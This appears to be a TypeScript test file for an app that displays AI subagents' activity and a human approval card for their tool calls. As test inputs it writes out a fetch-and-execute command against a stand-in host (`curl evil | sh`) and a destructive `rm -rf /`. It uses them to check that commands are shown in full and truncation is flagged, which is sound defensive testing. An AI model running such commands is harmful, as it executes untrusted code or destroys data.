/**
 * The activity strip's model, and the approval card's summary.
 *
 * Two things are worth the test file. The first is the **background dispatch**: with
 * `run_in_background` defaulting to true a dispatch's `tool_result` is a launch receipt, and
 * treating it as an ending is a bug this repository has already shipped once — on the floor,
 * where it made an employee walk to their desk and immediately walk back to report while the
 * agent was still working. The strip reads the same facts, so it can reproduce the same bug in
 * a second place, and the test below is what stops it.
 *
 * The second is the **approval summary**, which is a safety surface rather than a display one:
 * it asks somebody to say yes to a specific string, so what it shows has to be that string.
 */

import { test } from 'node:test'
import assert from 'node:assert/strict'

import {
  applyFact,
  applyNote,
  elapsed,
  settle,
  EMPTY,
  HISTORY_LIMIT,
  type Activity,
  collapse,
  type Entry,
} from '../src/shared/activity.js'
import { blockedBy, inAnswerOrder, summarise, MAX_DETAIL } from '../src/shared/approval-summary.js'
import type { Fact } from '../src/shared/floor/choreography.js'
import type { PendingApproval } from '../src/shared/ipc.js'

const T0 = '2026-08-20T14:30:00.000Z'
const T1 = '2026-08-20T14:30:05.000Z'

const fold = (facts: readonly Fact[], at = T0): Activity =>
  facts.reduce((activity, fact) => applyFact(activity, fact, at), EMPTY)

test('a dispatch puts somebody on the strip, and a result takes them off', () => {
  const started = fold([{ kind: 'dispatch', toolUseId: 'a', employee: 'reviewer', brief: 'check the retry ceiling' }])
  assert.equal(started.state.running.length, 1)
  assert.equal(started.state.running[0]?.who, 'reviewer')
  assert.match(started.state.history[0]?.text ?? '', /check the retry ceiling/)

  const ended = applyFact(started, { kind: 'delivered', toolUseId: 'a' }, T1)
  assert.deepEqual(ended.state.running, [])
  assert.equal(ended.state.history[0]?.kind, 'done')
})

test('a BACKGROUND dispatch survives its launch receipt', () => {
  // The bug this file exists for. `running` says the next `tool_result` for this id is a
  // receipt; acting on it would end the task milliseconds after it began, and the strip would
  // show an office where nothing ever takes any time.
  let activity = fold([
    { kind: 'dispatch', toolUseId: 'a', employee: 'builder', brief: 'add the retry ceiling' },
    { kind: 'running', toolUseId: 'a' },
  ])

  activity = applyFact(activity, { kind: 'delivered', toolUseId: 'a' }, T1)
  assert.equal(activity.state.running.length, 1, 'the launch receipt ended the task')
  assert.equal(activity.state.history.filter((e) => e.kind === 'done').length, 0)

  // The real completion carries the same id, and *that* one ends it.
  activity = applyFact(activity, { kind: 'delivered', toolUseId: 'a' }, T1)
  assert.deepEqual(activity.state.running, [])
  assert.equal(activity.state.history[0]?.kind, 'done')
})

test('a tool result nobody dispatched belongs to nobody', () => {
  // Most `tool_result`s are a Read or a Bash coming home. Ending a row on one would take the
  // wrong person off the strip.
  const activity = fold([{ kind: 'dispatch', toolUseId: 'a', employee: 'builder', brief: null }])
  const after = applyFact(activity, { kind: 'delivered', toolUseId: 'not-a-dispatch' }, T1)
  assert.equal(after.state.running.length, 1)
  assert.equal(after.state.history.length, activity.state.history.length)
})

test('tool calls refine a row rather than filling the log', () => {
  // Ten Reads in a row are one person working. A log line each would bury the dispatch that
  // says what they are working on.
  let activity = fold([{ kind: 'dispatch', toolUseId: 'a', employee: 'tester', brief: null }])
  const before = activity.state.history.length

  for (const tool of ['Read', 'Read', 'Grep', 'Bash']) {
    activity = applyFact(activity, { kind: 'acting', who: 'tester', tool }, T1)
  }

  assert.equal(activity.state.history.length, before)
  assert.equal(activity.state.running[0]?.doing, 'Bash')
})

test('a tool call by somebody who is not dispatched does not invent a row', () => {
  // The manager working in the chat. Putting them on the strip would show somebody running who
  // is not on the floor.
  const activity = applyFact(EMPTY, { kind: 'acting', who: 'manager', tool: 'Read' }, T0)
  assert.deepEqual(activity.state.running, [])
})

test('a second dispatch does not reset what the first one is doing', () => {
  let activity = fold([{ kind: 'dispatch', toolUseId: 'a', employee: 'builder', brief: null }])
  activity = applyFact(activity, { kind: 'acting', who: 'builder', tool: 'Edit' }, T1)
  activity = applyFact(activity, { kind: 'dispatch', toolUseId: 'b', employee: 'tester', brief: null }, T1)

  const builder = activity.state.running.find((r) => r.who === 'builder')
  assert.equal(builder?.doing, 'Edit', 'the row was rebuilt and lost what it knew')
})

test('a turn that ends mid-dispatch says so rather than leaving somebody running forever', () => {
  // The process was killed, or the turn was interrupted. Standing order three is broken by
  // omission here just as surely as by a claim: a strip showing work that stopped is a lie.
  const activity = fold([
    { kind: 'dispatch', toolUseId: 'a', employee: 'builder', brief: 'a long job' },
    { kind: 'running', toolUseId: 'a' },
  ])

  const after = settle(activity, T1)
  assert.deepEqual(after.state.running, [])
  assert.equal(after.state.history[0]?.kind, 'note')
  assert.match(after.state.history[0]?.text ?? '', /ended before they reported back/)
})

test('settling an idle office changes nothing at all', () => {
  const activity = applyNote(EMPTY, { kind: 'note', who: 'you', text: 'hello', at: T0 })
  assert.equal(settle(activity, T1), activity, 'a quiet result rewrote the state')
})

test('history is capped, newest kept', () => {
  let activity: Activity = EMPTY
  for (let i = 0; i < HISTORY_LIMIT + 20; i++) {
    activity = applyNote(activity, { kind: 'note', who: 'x', text: `line ${i}`, at: T0 })
  }
  assert.equal(activity.state.history.length, HISTORY_LIMIT)
  assert.equal(activity.state.history[0]?.text, `line ${HISTORY_LIMIT + 19}`)
})

test('a meeting with nobody says so', () => {
  // The floor already refuses to draw a meeting that was only described. The log matches it:
  // "called a meeting" over an empty attendee list would be the same claim in words.
  const activity = fold([{ kind: 'meeting', toolUseId: 'm', convener: 'manager', attendees: [] }])
  assert.match(activity.state.history[0]?.text ?? '', /with nobody/)
})

test('elapsed does not round up into the next unit early', () => {
  const start = Date.parse(T0)
  assert.equal(elapsed(T0, start), '0s')
  assert.equal(elapsed(T0, start + 59_000), '59s')
  assert.equal(elapsed(T0, start + 60_000), '1m')
  assert.equal(elapsed(T0, start + 59 * 60_000), '59m')
  assert.equal(elapsed(T0, start + 61 * 60_000), '1h1m')
  // A clock that went backwards is not a negative age.
  assert.equal(elapsed(T0, start - 5_000), '0s')
  assert.equal(elapsed('not a date', start), '')
})

// ──────────────────────────────────────────────────────────── the approval card ──

const held = (
  tool: string,
  input: Record<string, unknown>,
  askedAt = T0,
  waitMs: number | null = 240_000,
): PendingApproval => ({
  sessionId: 's',
  project: null,
  toolUseId: 't',
  waitMs,
  // The manager's own command. `null` is a positive answer here, not a placeholder.
  agent: null,
  tool,
  input,
  askedAt,
})

/*
 * Whose desk is stopped.
 *
 * `PendingApproval.agent` was measured in main, sent across the bridge, and read by nothing —
 * while its own comment said "the floor draws the waiting desk from this" and main's comment at
 * the point it is built said "`null` is the manager, not 'we could not tell'". Two careful notes
 * in two files, about a feature neither of them had. The card showed the tool, the command and
 * two buttons, and never said who was waiting.
 *
 * It matters on a floor with seven people on it: "one call is waiting" does not tell you whose
 * desk is stopped, and being able to see who is doing what is the entire premise of the app.
 */

test('the card names the employee whose command is stopped', () => {
  assert.equal(summarise(held('Bash', { command: 'npm test' })).blockedBy, 'the manager')
  assert.equal(
    summarise({ ...held('Bash', { command: 'npm test' }), agent: 'reviewer' }).blockedBy,
    'reviewer',
  )
})

test('null is the manager, and is named rather than left blank', () => {
  // The distinction the field exists for. `null` is a positive answer — the CLI puts `agent_type`
  // on every subagent tool call and on none of the manager's — so leaving the line empty would
  // render a fact we know as one we could not establish, which is the more worrying of the two
  // and the wrong one.
  assert.equal(blockedBy(null), 'the manager')
  assert.notEqual(blockedBy(null), '')
})

test('an employee is named exactly as their file spells it', () => {
  // Not prettified. The id is what `.claude/agents/` calls them and what the floor calls them,
  // so inventing a display name here would put a third spelling on screen.
  assert.equal(blockedBy('backend'), 'backend')
  assert.equal(blockedBy('general-purpose'), 'general-purpose')
})

test('the command is shown as the command, never paraphrased', () => {
  const summary = summarise(held('Bash', { command: 'rm -rf build', description: 'clean' }))
  assert.equal(summary.detail, 'rm -rf build')
  assert.equal(summary.weight, 'writes')
  assert.deepEqual(summary.rest, ['description=clean'])
})

test('an unrecognised tool is not treated as a safe one', () => {
  // An MCP tool goes wherever that server goes and nothing in its name says what it does.
  // "unknown" sorts with the things that need reading, not with the things that do not.
  const summary = summarise(held('mcp__notion__search', { query: 'salaries' }))
  assert.equal(summary.weight, 'unknown')
  assert.equal(summary.tool, 'mcp__notion__search')
  // No headline field is known for it, so everything it was given is listed rather than dropped.
  assert.deepEqual(summary.rest, ['query=salaries'])
})

test('a truncated command says it was truncated', () => {
  // The failure this prevents: `npm test && curl evil | sh` cut at the `&&` reads as a test run.
  const long = `${'a'.repeat(MAX_DETAIL)} && curl evil | sh`
  const summary = summarise(held('Bash', { command: long }))

  assert.equal(summary.truncated, true)
  assert.equal(summary.detail.length, MAX_DETAIL)

  const short = summarise(held('Bash', { command: 'ls' }))
  assert.equal(short.truncated, false)
})

test('a non-string argument is shown rather than silently dropped', () => {
  const summary = summarise(held('Edit', { file_path: 'a.ts', replace_all: true, count: 3 }))
  assert.equal(summary.detail, 'a.ts')
  assert.deepEqual(summary.rest, ['replace_all=true', 'count=3'])
})

test('a tool with no arguments at all still names itself', () => {
  const summary = summarise(held('SomeTool', {}))
  assert.equal(summary.tool, 'SomeTool')
  assert.equal(summary.detail, '')
  assert.deepEqual(summary.rest, [])
})

test('the oldest held call is answered first', () => {
  // It is closest to the hook's deadline, and it is also the one that has been on screen
  // longest — so this ordering is both the urgent one and the one that does not move cards
  // out from under a cursor.
  const order = inAnswerOrder([
    held('Bash', {}, '2026-08-20T14:31:00.000Z'),
    held('Read', {}, '2026-08-20T14:29:00.000Z'),
    held('Write', {}, '2026-08-20T14:30:00.000Z'),
  ])
  assert.deepEqual(
    order.map((r) => r.tool),
    ['Read', 'Write', 'Bash'],
  )
})

// ─────────────────────────────────────────── forty-one lines saying one thing ──

/**
 * Reported of the activity strip: it logs everything, and that is a lot of clutter. Forty-one
 * consecutive `you · allowed Bash` rows, against a cap of sixty — the log had spent two thirds
 * of its room saying the same six characters.
 *
 * Most of those existed because `bypass permissions` did not bypass, and are gone with that fix.
 * What is left still needs collapsing, and still needs to name the command rather than the tool,
 * because a log that cannot say *what* you allowed cannot answer the only question put to it.
 */
const line = (text: string, who = 'you', kind: Entry['kind'] = 'note'): Entry =>
  ({ kind, who, text, at: '2026-08-22T10:00:00.000Z' })

test('adjacent identical lines become one, counted', () => {
  const runs = collapse([line('allowed: npm test'), line('allowed: npm test'), line('allowed: npm test')])
  assert.equal(runs.length, 1)
  assert.equal(runs[0]?.count, 3)
})

test('two different commands never merge', () => {
  // The fix for "I cannot tell what I allowed" must not become "I can see one of the things I
  // allowed". Identical text only.
  const runs = collapse([line('allowed: npm test'), line('allowed: rm -rf /'), line('allowed: npm test')])
  assert.deepEqual(runs.map((r) => r.count), [1, 1, 1])
})

test('the same text from different people, or of a different kind, stays separate', () => {
  assert.equal(collapse([line('allowed: x', 'you'), line('allowed: x', 'tester')]).length, 2)
  assert.equal(collapse([line('allowed: x', 'you', 'note'), line('allowed: x', 'you', 'refused')]).length, 2)
})

test('only adjacent runs collapse, so the order of events survives', () => {
  const runs = collapse([line('a'), line('a'), line('b'), line('a')])
  assert.deepEqual(runs.map((r) => `${r.entry.text}x${r.count}`), ['ax2', 'bx1', 'ax1'])
})

test('an empty log collapses to nothing rather than to a run of nothing', () => {
  assert.deepEqual(collapse([]), [])
})
